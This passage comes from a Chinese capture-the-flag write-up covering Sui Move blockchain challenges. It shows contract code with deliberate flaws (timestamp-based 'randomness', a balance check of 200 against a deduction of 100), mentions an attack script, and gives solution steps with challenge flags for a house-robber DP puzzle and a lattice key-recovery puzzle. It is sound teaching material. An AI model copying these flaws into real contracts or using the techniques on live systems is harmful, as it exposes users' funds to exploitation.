    <span class="token keyword">let</span> d100 <span class="token operator">=</span> current_timestamp <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token comment">// ← 可预测的"随机"数</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>d100 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> current_balance <span class="token operator">=</span> <span class="token namespace">table<span class="token punctuation">::</span></span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> usersTokenAmount<span class="token punctuation">.</span>balances<span class="token punctuation">,</span> sender<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span>current_balance <span class="token operator">=</span> <span class="token operator">*</span>current_balance <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment">// 奖励</span>
        <span class="token namespace">event<span class="token punctuation">::</span></span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token class-name">Amount</span><span class="token punctuation">&#123;</span>amount<span class="token punctuation">:</span> <span class="token operator">*</span>current_balance<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> current_balance <span class="token operator">=</span> <span class="token namespace">table<span class="token punctuation">::</span></span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> usersTokenAmount<span class="token punctuation">.</span>balances<span class="token punctuation">,</span> sender<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span>current_balance <span class="token operator">=</span> <span class="token operator">*</span>current_balance <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment">// 惩罚</span>
        <span class="token namespace">event<span class="token punctuation">::</span></span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token class-name">Amount</span><span class="token punctuation">&#123;</span>amount<span class="token punctuation">:</span> <span class="token operator">*</span>current_balance<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="漏洞代码3-计费错误"><a href="#漏洞代码3-计费错误" class="headerlink" title="漏洞代码3: 计费错误"></a>漏洞代码3: 计费错误</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">public entry fun <span class="token function">buy_box</span><span class="token punctuation">(</span>usersTokenAmount<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">UsersTokenAmount</span><span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> sender <span class="token operator">=</span> <span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">sender</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> current_balance <span class="token operator">=</span> <span class="token namespace">table<span class="token punctuation">::</span></span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> usersTokenAmount<span class="token punctuation">.</span>balances<span class="token punctuation">,</span> sender<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token namespace">event<span class="token punctuation">::</span></span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token class-name">Amount</span><span class="token punctuation">&#123;</span>amount<span class="token punctuation">:</span> <span class="token operator">*</span>current_balance<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token operator">*</span>current_balance <span class="token operator">>=</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token constant">ERROR_NO_MONEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ← 检查200</span>
    <span class="token operator">*</span>current_balance <span class="token operator">=</span> <span class="token operator">*</span>current_balance <span class="token operator">-</span> <span class="token number">100</span><span class="token punctuation">;</span>         <span class="token comment">// ← 但只扣100</span>
    <span class="token keyword">let</span> <span class="token keyword">box</span> <span class="token operator">=</span> <span class="token namespace">inventory<span class="token punctuation">::</span></span><span class="token function">create_treasury_box</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token namespace">transfer<span class="token punctuation">::</span></span><span class="token function">public_transfer</span><span class="token punctuation">(</span><span class="token keyword">box</span><span class="token punctuation">,</span> <span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">sender</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="完整攻击脚本"><a href="#完整攻击脚本" class="headerlink" title="完整攻击脚本"></a>完整攻击脚本</h2><p>将攻击脚本保存为 <code>ptb_batch_attack.sh</code> 并执行：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x ptb_batch_attack.sh
./ptb_batch_attack.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>脚本会自动：</p>
<ol>
<li>监控时间戳，等待有利时机</li>
<li>执行PTB批量攻击</li>
<li>购买宝箱并获取Flag</li>
<li>输出Flag交易哈希</li>
</ol>
<h2 id="学习要点"><a href="#学习要点" class="headerlink" title="学习要点"></a>学习要点</h2><ol>
<li><strong>代码审计重要性</strong>: 仔细检查每一行代码，包括注释</li>
<li><strong>漏洞组合威力</strong>: 多个小漏洞组合可能产生严重影响</li>
<li><strong>区块链特性利用</strong>: 理解PTB等区块链特有机制</li>
<li><strong>攻击链构造</strong>: 从信息收集到最终利用的完整流程</li>
</ol>
<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul>
<li><a target="_blank" rel="noopener" href="https://docs.sui.io/concepts/sui-move-concepts">Sui Move 官方文档</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.sui.io/concepts/transactions/prog-txn-blocks">PTB 编程指南</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/slowmist/Knowledge-Base/blob/master/translations/move-security-guidelines-zh.md">智能合约安全最佳实践</a></li>
</ul>
<hr>
<h1 id="2-强盗游戏"><a href="#2-强盗游戏" class="headerlink" title="2. 强盗游戏"></a>2. 强盗游戏</h1><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><ul>
<li><strong>题目名称</strong>: 强盗游戏</li>
<li><strong>题目积分</strong>: 52</li>
<li><strong>分类</strong>: blockchain, hohctf, sui, move</li>
<li><strong>解题人数</strong>: 46</li>
</ul>
<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>房屋加权的强盗游戏，你能成功获取目标金额吗？HOH moveCTF 强盗游戏</p>
<p>题目提供了一个独特的 Sui Move 合约：</p>
<ul>
<li><strong>Package ID</strong>: <code>0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c</code></li>
<li><strong>部署交易哈希</strong>: <code>JB4yrd8L6srxeLv6mAhBo13sYdXqzVyJiXVCSXwQgvxY</code></li>
</ul>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="1-合约分析"><a href="#1-合约分析" class="headerlink" title="1. 合约分析"></a>1. 合约分析</h3><p>首先分析Move合约源码，发现这是一个基于动态规划的”房屋强盗”问题变种：</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">module <span class="token namespace">game<span class="token punctuation">::</span></span>ez_game <span class="token punctuation">&#123;</span>
    public <span class="token keyword">struct</span> <span class="token type-definition class-name">Challenge</span> has key<span class="token punctuation">,</span> store <span class="token punctuation">&#123;</span>
        id<span class="token punctuation">:</span> <span class="token constant">UID</span><span class="token punctuation">,</span>
        initial_part<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token keyword">u64</span><span class="token operator">></span><span class="token punctuation">,</span>
        weights<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token keyword">u64</span><span class="token operator">></span><span class="token punctuation">,</span>
        target_amount<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>

    public <span class="token keyword">struct</span> <span class="token type-definition class-name">Flag</span> has copy<span class="token punctuation">,</span> drop <span class="token punctuation">&#123;</span>
        owner<span class="token punctuation">:</span> address<span class="token punctuation">,</span>
        flag<span class="token punctuation">:</span> <span class="token keyword">bool</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关键函数：</p>
<ul>
<li><code>init_game</code>: 初始化游戏，创建Challenge对象，设置随机目标金额(10-20)</li>
<li><code>get_flag</code>: 验证用户输入，如果计算结果等于目标金额则触发Flag事件</li>
<li><code>weighted_rob</code>: 加权房屋强盗算法核心实现</li>
</ul>
<h3 id="2-算法理解"><a href="#2-算法理解" class="headerlink" title="2. 算法理解"></a>2. 算法理解</h3><p><code>weighted_rob</code>函数实现了一个动态规划算法：</p>
<ul>
<li>初始房屋：<code>[1, 1, 3, 1, 1]</code></li>
<li>初始权重：<code>[1, 1, 2, 1, 1]</code></li>
<li>用户可以添加额外房屋（权重默认为1）</li>
<li>不能抢劫相邻的房屋</li>
<li>每个房屋的价值 &#x3D; 房屋值 × 权重</li>
<li>目标：找到最大收益</li>
</ul>
<h3 id="3-解题脚本"><a href="#3-解题脚本" class="headerlink" title="3. 解题脚本"></a>3. 解题脚本</h3><p>编写Python脚本分析所有可能的目标金额：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">weighted_rob</span><span class="token punctuation">(</span>houses<span class="token punctuation">,</span> weights<span class="token punctuation">)</span><span class="token punctuation">:</span>
    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>houses<span class="token punctuation">)</span>
    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span>

    dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>houses<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> weights<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> n <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>
        dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">max</span><span class="token punctuation">(</span>
            houses<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> weights<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            houses<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> weights<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        dp_i_1 <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
        dp_i_2_plus_house <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> houses<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> weights<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">max</span><span class="token punctuation">(</span>dp_i_1<span class="token punctuation">,</span> dp_i_2_plus_house<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过分析发现所有目标金额的解决方案：</p>
<ul>
<li>目标金额 10 → 用户输入: [3]</li>
<li>目标金额 11 → 用户输入: [4]</li>
<li>目标金额 12 → 用户输入: [5]</li>
<li>…</li>
<li>目标金额 20 → 用户输入: [13]</li>
</ul>
<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="1-初始化游戏"><a href="#1-初始化游戏" class="headerlink" title="1. 初始化游戏"></a>1. 初始化游戏</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client call <span class="token parameter variable">--package</span> 0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c <span class="token punctuation">\</span>
  <span class="token parameter variable">--module</span> ez_game <span class="token parameter variable">--function</span> init_game <span class="token parameter variable">--args</span> 0x8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>创建了Challenge对象：<code>0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92</code></p>
<h3 id="2-查看Challenge对象"><a href="#2-查看Challenge对象" class="headerlink" title="2. 查看Challenge对象"></a>2. 查看Challenge对象</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client object 0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>获取到关键信息：</p>
<ul>
<li><strong>目标金额</strong>: 15</li>
<li><strong>初始房屋</strong>: [1, 1, 3, 1, 1]</li>
<li><strong>权重</strong>: [1, 1, 2, 1, 1]</li>
</ul>
<h3 id="3-计算解决方案"><a href="#3-计算解决方案" class="headerlink" title="3. 计算解决方案"></a>3. 计算解决方案</h3><p>根据目标金额15，对应的用户输入是 <code>[8]</code>。</p>
<p>验证计算过程：</p>
<ul>
<li>完整房屋列表：<code>[1, 1, 3, 1, 1, 8]</code></li>
<li>完整权重列表：<code>[1, 1, 2, 1, 1, 1]</code></li>
<li>DP计算：<ul>
<li>dp[0] &#x3D; 1 × 1 &#x3D; 1</li>
<li>dp[1] &#x3D; max(1×1, 1×1) &#x3D; 1</li>
<li>dp[2] &#x3D; max(1, 1 + 3×2) &#x3D; 7</li>
<li>dp[3] &#x3D; max(7, 1 + 1×1) &#x3D; 7</li>
<li>dp[4] &#x3D; max(7, 7 + 1×1) &#x3D; 8</li>
<li>dp[5] &#x3D; max(8, 7 + 8×1) &#x3D; 15 ✓</li>
</ul>
</li>
</ul>
<h3 id="4-获取Flag-1"><a href="#4-获取Flag-1" class="headerlink" title="4. 获取Flag"></a>4. 获取Flag</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client call <span class="token parameter variable">--package</span> 0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c <span class="token punctuation">\</span>
  <span class="token parameter variable">--module</span> ez_game <span class="token parameter variable">--function</span> get_flag <span class="token punctuation">\</span>
  <span class="token parameter variable">--args</span> <span class="token string">"[8]"</span> 0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="解题结果"><a href="#解题结果" class="headerlink" title="解题结果"></a>解题结果</h2><p><strong>成功触发Flag事件！</strong></p>
<p><strong>触发Flag的交易哈希</strong>: <code>3ZbbGVQkNLxuUACjdnRbLb5YF9NQ5MDuTiogDD3HYwaa</code></p>
<p>交易事件中显示：</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"flag"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
  <span class="token property">"owner"</span><span class="token operator">:</span> <span class="token string">"0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="关键技术点"><a href="#关键技术点" class="headerlink" title="关键技术点"></a>关键技术点</h2><ol>
<li><strong>Sui Move合约交互</strong>: 理解Sui区块链的对象模型和交易机制</li>
<li><strong>动态规划算法</strong>: 掌握房屋强盗问题的经典DP解法</li>
<li><strong>加权变种</strong>: 理解权重对算法结果的影响</li>
<li><strong>随机性处理</strong>: 分析所有可能的目标金额并预计算解决方案</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题目巧妙地将经典的动态规划问题与区块链技术结合，考查了：</p>
<ul>
<li>Move语言和Sui区块链的基础知识</li>
<li>动态规划算法的理解和实现</li>
<li>逆向分析和解题思维</li>
</ul>
<hr>
<h1 id="3-恢复密钥"><a href="#3-恢复密钥" class="headerlink" title="3. 恢复密钥"></a>3. 恢复密钥</h1><h2 id="题目信息-1"><a href="#题目信息-1" class="headerlink" title="题目信息"></a>题目信息</h2><ul>
<li><strong>题目名称</strong>: 恢复私钥</li>
<li><strong>题目积分</strong>: 63</li>
<li><strong>分类</strong>: blockchain, hohctf, sui, move</li>
<li><strong>解题人数</strong>: 32</li>
<li><strong>题目描述</strong>: 我在链上用随机数隐藏了我的私钥，但是我忘记我私钥的内容了，你能帮我恢复私钥嘛？</li>
</ul>
<h2 id="题目环境"><a href="#题目环境" class="headerlink" title="题目环境"></a>题目环境</h2><ul>
<li><strong>Package ID</strong>: <code>0xd1861626bde7486744877f9ac90ac025976bab6617384cd3e6816e833dd94be9</code></li>
<li><strong>部署交易哈希</strong>: <code>Go2jkNk5tR1EnCNV2Fw2zaP6zQfQRPfUeEFyyi6rtJiR</code></li>
</ul>
<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="1. 题目分析"></a>1. 题目分析</h3><p>这是一道结合了密码学和区块链技术的综合性CTF题目。通过分析提供的Move智能合约源码，可以发现：</p>
<ol>
<li>题目使用线性代数加密方案隐藏flag</li>
<li>加密公式：<code>enc = A * flag + k</code><ul>
<li><code>A</code>: 64x23的固定矩阵</li>
<li><code>flag</code>: 23字节的明文（即我们要恢复的私钥）</li>
<li><code>k</code>: 64维随机向量</li>
<li><code>enc</code>: 64维密文向量</li>
</ul>
</li>
</ol>
<h3 id="2-关键代码分析"><a href="#2-关键代码分析" class="headerlink" title="2. 关键代码分析"></a>2. 关键代码分析</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 加密函数</span>
entry fun <span class="token function">entrypt_flag</span><span class="token punctuation">(</span>plain_flag<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token keyword">u8</span><span class="token operator">></span><span class="token punctuation">,</span> r<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Random</span><span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token function">get_a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 获取64x23矩阵</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> k<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token keyword">u64</span><span class="token operator">></span> <span class="token operator">=</span> vector<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">// 生成64个随机数作为噪声</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        k<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token namespace">random<span class="token punctuation">::</span></span><span class="token function">generate_u64_in_range</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> generator<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4294967296</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token comment">// 执行加密: enc = A * flag + k</span>
    <span class="token keyword">let</span> enc <span class="token operator">=</span> <span class="token function">matadd</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token function">matmul</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ex_plain_flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 验证函数</span>
public entry fun <span class="token function">decrypt_flag</span><span class="token punctuation">(</span>flag<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token keyword">u8</span><span class="token operator">></span><span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">blake2b256</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flag<span class="token punctuation">)</span> <span class="token operator">==</span> x<span class="token string">"5c9d8d1c17561e80b1e29b4a7809b369eb94e3d8b6808c19c69e25f94f67817a"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token namespace">event<span class="token punctuation">::</span></span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token class-name">FlagEvent</span> <span class="token punctuation">&#123;</span>
        owner<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span><span class="token function">sender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        flag<span class="token punctuation">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="3-密码学原理"><a href="#3-密码学原理" class="headerlink" title="3. 密码学原理"></a>3. 密码学原理</h3><p>这是一个基于格理论的加密方案，类似于Learning With Errors (LWE) 问题。要解密需要解决最近向量问题（CVP - Closest Vector Problem）。</p>
<h2 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="步骤1-环境准备"><a href="#步骤1-环境准备" class="headerlink" title="步骤1: 环境准备"></a>步骤1: 环境准备</h3><p>首先安装SageMath数学计算软件：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> sagemath<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="步骤2-分析密文"><a href="#步骤2-分析密文" class="headerlink" title="步骤2: 分析密文"></a>步骤2: 分析密文</h3><p>从合约源码中可以看到加密后的密文：</p>
<pre class="line-numbers language-none"><code class="language-none">[13244763658160674624, 16984722715248776010, 13823152552092075312, ...]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="步骤3-使用CVP算法解密"><a href="#步骤3-使用CVP算法解密" class="headerlink" title="步骤3: 使用CVP算法解密"></a>步骤3: 使用CVP算法解密</h3><p>题目提供了解密脚本 <code>decrypt.sage</code>，核心算法是Babai CVP算法：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">Babai_CVP</span><span class="token punctuation">(</span>Lattice<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>
    M <span class="token operator">=</span> Lattice<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>
    G <span class="token operator">=</span> M<span class="token punctuation">.</span>gram_schmidt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    diff <span class="token operator">=</span> target
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>M<span class="token punctuation">.</span>nrows<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        diff <span class="token operator">-=</span>  M<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>diff <span class="token operator">*</span> G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">round</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> target <span class="token operator">-</span> diff<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="步骤4-运行解密脚本"><a href="#步骤4-运行解密脚本" class="headerlink" title="步骤4: 运行解密脚本"></a>步骤4: 运行解密脚本</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> solve/tests
sage decrypt.sage<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>输出结果：</p>
<pre class="line-numbers language-none"><code class="language-none">[-]the flag length is: 23
(102, 108, 97, 103, 123, 53, 85, 105, 95, 77, 48, 86, 101, 95, 67, 79, 78, 116, 114, 65, 67, 55, 125)
[+]flag&#123;5Ui_M0Ve_CONtrAC7&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="步骤5-验证flag"><a href="#步骤5-验证flag" class="headerlink" title="步骤5: 验证flag"></a>步骤5: 验证flag</h3><p>使用Sui CLI调用链上合约验证flag：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client call <span class="token punctuation">\</span>
  <span class="token parameter variable">--package</span> 0xd1861626bde7486744877f9ac90ac025976bab6617384cd3e6816e833dd94be9 <span class="token punctuation">\</span>
  <span class="token parameter variable">--module</span> crypto <span class="token punctuation">\</span>
  <span class="token parameter variable">--function</span> decrypt_flag <span class="token punctuation">\</span>
  <span class="token parameter variable">--args</span> <span class="token string">"flag&#123;5Ui_M0Ve_CONtrAC7&#125;"</span> <span class="token punctuation">\</span>
  --gas-budget <span class="token number">10000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="解题结果-1"><a href="#解题结果-1" class="headerlink" title="解题结果"></a>解题结果</h2><ul>
<li><strong>Flag</strong>: <code>flag&#123;5Ui_M0Ve_CONtrAC7&#125;</code></li>
<li><strong>交易哈希</strong>: <code>2FPqgAyMe2e7qB5xigrwi35oTqrmwmuC45pCudHLdtVX</code></li>
<li><strong>验证状态</strong>: Success，成功触发FlagEvent</li>
</ul>
<h2 id="技术要点"><a href="#技术要点" class="headerlink" title="技术要点"></a>技术要点</h2><h3 id="1-格理论基础"><a href="#1-格理论基础" class="headerlink" title="1. 格理论基础"></a>1. 格理论基础</h3><ul>
<li><strong>格 (Lattice)</strong>: 由基向量张成的离散点集</li>
<li><strong>CVP问题</strong>: 给定格和目标向量，找到格中最接近目标的向量</li>
<li><strong>LLL算法</strong>: 格基约化算法，用于找到较短的基向量</li>
</ul>
<h3 id="2-Babai算法"><a href="#2-Babai算法" class="headerlink" title="2. Babai算法"></a>2. Babai算法</h3><p>Babai算法是解决CVP问题的近似算法：</p>
<ol>
<li>对格基进行LLL约化</li>
<li>使用Gram-Schmidt正交化</li>
<li>通过舍入操作找到最近向量</li>
</ol>
<h3 id="3-Move智能合约"><a href="#3-Move智能合约" class="headerlink" title="3. Move智能合约"></a>3. Move智能合约</h3><ul>
<li>使用Sui区块链的Move语言</li>
<li>集成随机数生成器进行加密</li>
